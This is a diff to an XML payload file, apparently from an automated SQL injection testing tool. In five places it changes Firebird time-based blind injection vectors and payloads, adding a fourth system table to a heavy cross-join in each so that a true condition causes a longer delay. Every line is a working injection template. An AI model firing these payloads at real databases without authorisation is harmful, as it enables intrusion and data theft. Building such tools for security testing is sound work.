@@ -2252,9 +2252,9 @@ Formats:
         <risk>2</risk>
         <clause>0</clause>
         <where>1</where>
-        <vector>; SELECT IIF(([INFERENCE]),(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3),[RANDNUM]) FROM RDB$DATABASE</vector>
+        <vector>; SELECT IIF(([INFERENCE]),(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4),[RANDNUM]) FROM RDB$DATABASE</vector>
         <request>
-            <payload>; SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3</payload>
+            <payload>; SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4</payload>
             <comment>--</comment>
         </request>
         <response>
@@ -2621,9 +2621,9 @@ Formats:
         <risk>2</risk>
         <clause>1</clause>
         <where>1</where>
-        <vector>AND [RANDNUM]=IIF(([INFERENCE]),(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3),[RANDNUM])</vector>
+        <vector>AND [RANDNUM]=IIF(([INFERENCE]),(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4),[RANDNUM])</vector>
         <request>
-            <payload>AND [RANDNUM]=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3)</payload>
+            <payload>AND [RANDNUM]=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)</payload>
         </request>
         <response>
             <time>[DELAYED]</time>
@@ -2641,9 +2641,9 @@ Formats:
         <risk>2</risk>
         <clause>1</clause>
         <where>1</where>
-        <vector>AND [RANDNUM]=IIF(([INFERENCE]),(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3),[RANDNUM])</vector>
+        <vector>AND [RANDNUM]=IIF(([INFERENCE]),(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4),[RANDNUM])</vector>
         <request>
-            <payload>AND [RANDNUM]=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3)</payload>
+            <payload>AND [RANDNUM]=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)</payload>
             <comment>--</comment>
         </request>
         <response>
@@ -2901,9 +2901,9 @@ Formats:
         <risk>3</risk>
         <clause>1</clause>
         <where>2</where>
-        <vector>OR [RANDNUM]=IIF(([INFERENCE]),(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3),[RANDNUM])</vector>
+        <vector>OR [RANDNUM]=IIF(([INFERENCE]),(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4),[RANDNUM])</vector>
         <request>
-            <payload>OR [RANDNUM]=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3)</payload>
+            <payload>OR [RANDNUM]=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)</payload>
         </request>
         <response>
             <time>[DELAYED]</time>
@@ -3198,9 +3198,9 @@ Formats:
         <risk>2</risk>
         <clause>1,2,3</clause>
         <where>3</where>
-        <vector>IIF(([INFERENCE]),(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3),[RANDNUM])</vector>
+        <vector>IIF(([INFERENCE]),(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4),[RANDNUM])</vector>
         <request>
-            <payload>(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3)</payload>
+            <payload>(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)</payload>
         </request>
         <response>
             <time>[DELAYED]</time>
